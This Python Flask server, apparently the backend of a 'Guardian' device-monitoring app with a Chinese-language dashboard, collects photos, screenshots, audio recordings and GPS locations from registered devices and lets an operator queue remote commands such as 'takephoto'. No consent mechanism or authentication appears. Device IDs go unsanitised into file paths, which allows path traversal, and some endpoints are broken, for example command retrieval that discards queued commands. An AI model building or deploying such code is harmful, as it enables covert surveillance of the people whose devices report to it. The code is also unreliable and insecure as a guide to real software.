#!/usr/bin/env python3
"""
Guardian App Server - Railway Deployment
"""
import os
import sys

from flask import Flask, request, jsonify, send_file, Response
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Config - Railway provides PORT env var
PORT = int(os.environ.get('PORT', 5000))
HOST = '0.0.0.0'

# Ensure upload directories exist
for dir_name in ['uploads', 'audio_uploads', 'location_logs', 'alert_logs', 'live_screens']:
    os.makedirs(dir_name, exist_ok=True)

@app.route('/health')
def health():
    return 'OK', 200

@app.route('/')
def index():
    return 'Guardian App Server is running', 200

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json() or {}
    device_id = data.get('device_id', 'unknown')
    with open('device_registry.txt', 'a') as f:
        f.write(f"{device_id}|{datetime.now().isoformat()}\n")
    return jsonify({'status': 'ok', 'device_id': device_id})

@app.route('/api/upload', methods=['POST'])
def upload():
    if 'image' in request.content_type or request.content_length > 10000:
        file = request.files.get('image') or request.files.get('file')
        if file:
            filename = f"uploads/{uuid.uuid4().hex}.jpg"
            file.save(filename)
            return jsonify({'status': 'ok', 'path': filename})
    data = request.get_json() or {}
    image_data = data.get('image_data') or data.get('image')
    if image_data:
        import base64
        filename = f"uploads/{uuid.uuid4().hex}.jpg"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(image_data))
        return jsonify({'status': 'ok', 'path': filename})
    return jsonify({'status': 'ok'})

@app.route('/api/location', methods=['POST'])
def location():
    data = request.get_json() or {}
    lat = data.get('latitude')
    lng = data.get('longitude')
    ts = data.get('timestamp', datetime.now().isoformat())
    device_id = data.get('device_id', 'unknown')
    log_entry = f"{device_id}|{lat},{lng}|{ts}\n"
    with open('location_logs/locations.txt', 'a') as f:
        f.write(log_entry)
    return jsonify({'status': 'ok'})

@app.route('/api/alert', methods=['POST'])
def alert():
    data = request.get_json() or {}
    device_id = data.get('device_id', 'unknown')
    alert_type = data.get('type', 'unknown')
    ts = datetime.now().isoformat()
    with open('alert_logs/alerts.txt', 'a') as f:
        f.write(f"{device_id}|{alert_type}|{ts}\n")
    return jsonify({'status': 'ok'})

@app.route('/api/audio', methods=['POST'])
def audio():
    file = request.files.get('audio')
    if file:
        filename = f"audio_uploads/{uuid.uuid4().hex}.wav"
        file.save(filename)
        return jsonify({'status': 'ok', 'path': filename})
    return jsonify({'status': 'ok'})

@app.route('/api/screenshot', methods=['POST'])
def screenshot():
    if 'image' in request.content_type or request.content_length > 10000:
        file = request.files.get('image')
        if file:
            filename = f"uploads/screenshot_{uuid.uuid4().hex}.jpg"
            file.save(filename)
            return jsonify({'status': 'ok', 'path': filename})
    data = request.get_json() or {}
    image_data = data.get('image_data')
    if image_data:
        import base64
        filename = f"uploads/screenshot_{uuid.uuid4().hex}.jpg"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(image_data))
        return jsonify({'status': 'ok', 'path': filename})
    return jsonify({'status': 'ok'})

@app.route('/api/devices', methods=['GET'])
def devices():
    device_ids = []
    if os.path.exists('device_registry.txt'):
        with open('device_registry.txt') as f:
            for line in f:
                parts = line.strip().split('|')
                if parts:
                    device_ids.append(parts[0])
    return jsonify({'devices': list(set(device_ids))})

@app.route('/api/devices_list', methods=['GET'])
def devices_list():
    return jsonify({'devices': [{'id': did, 'status': 'online'} for did in []]})

@app.route('/inbox', methods=['GET'])
def inbox():
    device_id = request.args.get('device_id', '')
    marker = request.args.get('marker', '')
    marker_file = f'pending/{device_id}.json'
    if os.path.exists(marker_file):
        with open(marker_file) as f:
            return jsonify(json.load(f))
    return jsonify({'commands': []})

@app.route('/get_command', methods=['POST'])
def get_command():
    data = request.get_json() or {}
    device_id = data.get('device_id', 'unknown')
    pending_file = f'pending/{device_id}.json'
    if os.path.exists(pending_file):
        os.remove(pending_file)
    return jsonify({'commands': []})

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.get_json() or {}
    device_id = data.get('device_id', '')
    command = data.get('command', '')
    pending_file = f'pending/{device_id}.json'
    os.makedirs('pending', exist_ok=True)
    with open(pending_file, 'w') as f:
        json.dump({'commands': [command]}, f)
    return jsonify({'status': 'ok', 'command': command})

@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({'status': 'ok', 'server': 'guardian-app-server'})

@app.route('/api/logs', methods=['GET'])
def logs():
    device_id = request.args.get('device_id', '')
    log_file = f'activity_logs/{device_id}.txt'
    if os.path.exists(log_file):
        with open(log_file) as f:
            return jsonify({'logs': f.readlines()[-100:]})
    return jsonify({'logs': []})

@app.route('/dashboard')
def dashboard():
    html = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Guardian Dashboard</title>
    <style>body{font-family:Arial,sans-serif;margin:20px;background:#f0f2f5}
    h1{color:#1a1a2e}h2{color:#16213e}.card{background:white;padding:20px;border-radius:10px;margin:10px 0;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
    input,select,button{padding:10px;margin:5px;border-radius:5px;border:1px solid #ddd}
    button{background:#1a1a2e;color:white;cursor:pointer;border:none}
    button:hover{background:#16213e}#log{background:#f8f8f8;padding:10px;max-height:300px;overflow-y:auto;font-size:13px}
    </style></head><body>
    <h1>🛡️ Guardian 控制面板</h1>
    <div class="card">
    <h2>📱 设备</h2>
    <select id="deviceSelect"><option value="">加载中...</option></select>
    </div>
    <div class="card">
    <h2>📡 发送指令</h2>
    <input id="commandInput" placeholder="指令如: takephoto">
    <button onclick="sendCommand()">发送</button>
    <button onclick="clearLogs()">清除日志</button>
    </div>
    <div class="card">
    <h2>📋 活动日志</h2>
    <div id="log"></div>
    </div>
    <script>
    let devices = [];
    function log(msg) { console.log(msg); document.getElementById('log').innerHTML += '<div>' + msg + '</div>'; }
    async function refresh() {
        try {
            let r = await fetch('/api/devices');
            let d = await r.json();
            devices = d.devices || [];
            let sel = document.getElementById('deviceSelect');
            sel.innerHTML = devices.length ? devices.map(s => '<option>'+s+'</option>').join('') : '<option>无设备</option>';
        } catch(e) { log('刷新设备: ' + e.message); }
    }
    async function sendCommand() {
        let cmd = document.getElementById('commandInput').value;
        let did = document.getElementById('deviceSelect').value;
        if (!did || !cmd) { alert('请选择设备并输入指令'); return; }
        try {
            await fetch('/send_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({device_id:did, command:cmd})});
            log('已发送: ' + cmd + ' → ' + did);
        } catch(e) { log('发送失败: ' + e.message); }
    }
    function clearLogs() { document.getElementById('log').innerHTML = ''; }
    refresh();
    setInterval(refresh, 5000);
    </script></body></html>"""
    return Response(html, mimetype='text/html')

from datetime import datetime
import uuid
import json
import base64

if __name__ == '__main__':
    print(f"Starting server on {HOST}:{PORT}")
    app.run(host=HOST, port=PORT)